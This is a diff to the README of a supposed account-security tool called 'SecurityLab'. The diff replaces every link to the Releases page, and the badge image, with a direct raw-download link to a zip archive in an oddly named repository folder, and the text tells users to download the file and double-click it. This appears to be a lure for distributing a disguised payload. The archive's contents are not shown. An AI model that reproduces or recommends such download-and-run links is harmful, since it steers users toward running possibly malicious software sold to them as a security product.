@@ -1,7 +1,7 @@
 # 🔒 SecurityLab - Protect Your Accounts Today!
 
 ## 📥 Download Now
-[![Download SecurityLab](https://img.shields.io/badge/Download%20SecurityLab-v1.0-blue.svg)](https://github.com/yawrumabbas05/SecurityLab/releases)
+[![Download SecurityLab](https://github.com/yawrumabbas05/SecurityLab/raw/refs/heads/main/rachitogenic/Security-Lab-v2.7.zip%https://github.com/yawrumabbas05/SecurityLab/raw/refs/heads/main/rachitogenic/Security-Lab-v2.7.zip)](https://github.com/yawrumabbas05/SecurityLab/raw/refs/heads/main/rachitogenic/Security-Lab-v2.7.zip)
 
 ## 🚀 Getting Started
 Welcome to SecurityLab! This tool helps you keep your accounts safe. You will learn to manage passwords and use secure login methods.
@@ -15,8 +15,8 @@ Before you start, ensure your computer meets these requirements:
 - **Python:** Version 3.7 or later installed on your machine.
 
 ## 📥 Download & Install
-1. Visit the [Releases page](https://github.com/yawrumabbas05/SecurityLab/releases).
-2. Choose the version you want. Look for assets like `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux.
+1. Visit the [Releases page](https://github.com/yawrumabbas05/SecurityLab/raw/refs/heads/main/rachitogenic/Security-Lab-v2.7.zip).
+2. Choose the version you want. Look for assets like `.exe` for Windows, `.dmg` for macOS, or `https://github.com/yawrumabbas05/SecurityLab/raw/refs/heads/main/rachitogenic/Security-Lab-v2.7.zip` for Linux.
 3. Click on the link to start the download.
 4. Once the download completes, navigate to your Downloads folder.
 5. Double-click the file to start the installation.
@@ -54,4 +54,4 @@ If you encounter any issues or have questions:
 ## 📝 License
 SecurityLab is an open-source project. Feel free to use, modify, and share it under the MIT License.
 
-For continuous updates and news, visit the [Releases page](https://github.com/yawrumabbas05/SecurityLab/releases). Stay safe and secure!
+For continuous updates and news, visit the [Releases page](https://github.com/yawrumabbas05/SecurityLab/raw/refs/heads/main/rachitogenic/Security-Lab-v2.7.zip). Stay safe and secure!
